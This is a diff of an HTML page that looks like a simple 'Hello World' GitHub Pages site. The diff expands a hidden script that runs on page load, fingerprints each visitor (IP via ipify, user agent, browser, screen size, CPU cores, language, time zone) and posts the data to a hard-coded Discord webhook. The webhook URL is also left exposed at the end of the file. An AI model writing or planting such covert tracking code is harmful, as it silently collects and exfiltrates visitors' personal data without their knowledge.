@@ -2,11 +2,13 @@
 <html lang="en">
 <head>
 
-  <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; 
+ <script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
+
+  // Get User-Agent string
   const userAgent = navigator.userAgent;
 
-
+  // Get browser info with modern fallback
   let browserInfo;
   if (navigator.userAgentData) {
     // Chromium-based browsers
@@ -24,20 +26,44 @@
   // Get screen resolution
   const screenRes = `${screen.width}x${screen.height}`;
 
+  // Get CPU cores
+  const cpuCores = navigator.hardwareConcurrency || "Unknown";
+
+  // Get browser language
+  const browserLang = navigator.language || "Unknown";
+
+  // Get time zone
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+
   // Fetch public IP
   fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(data => {
       const ip = data.ip;
 
-      // Send all info to Discord webhook
+      // Send all info to Discord webhook using an embed
       return fetch(WEBHOOK_URL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `New visitor:\nIP: ${ip}\nUser-Agent: ${userAgent}\nBrowser: ${browserInfo}\nScreen Resolution: ${screenRes}`
+          embeds: [
+            {
+              title: "🆕 New Visitor",
+              color: 3447003, // Blue color
+              fields: [
+                { name: "IP Address", value: ip, inline: true },
+                { name: "Browser", value: browserInfo, inline: true },
+                { name: "User-Agent", value: userAgent, inline: false },
+                { name: "Screen Resolution", value: screenRes, inline: true },
+                { name: "CPU Cores", value: cpuCores.toString(), inline: true },
+                { name: "Browser Language", value: browserLang, inline: true },
+                { name: "Time Zone", value: timeZone, inline: true }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
         })
       });
     })
@@ -46,23 +72,9 @@
     });
 </script>
 
-
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>My Website</title>
-  <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      padding: 50px; 
-      background-color: #f0f0f0; 
-    }
-    h1 { color: #333; }
-    p { color: #555; }
-  </style>
 </head>
 <body>
   <h1>Hello World! </h1>
   <p>Welcome to my first GitHub Pages website.</p>
 </body>
-</html>
+</html>https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H
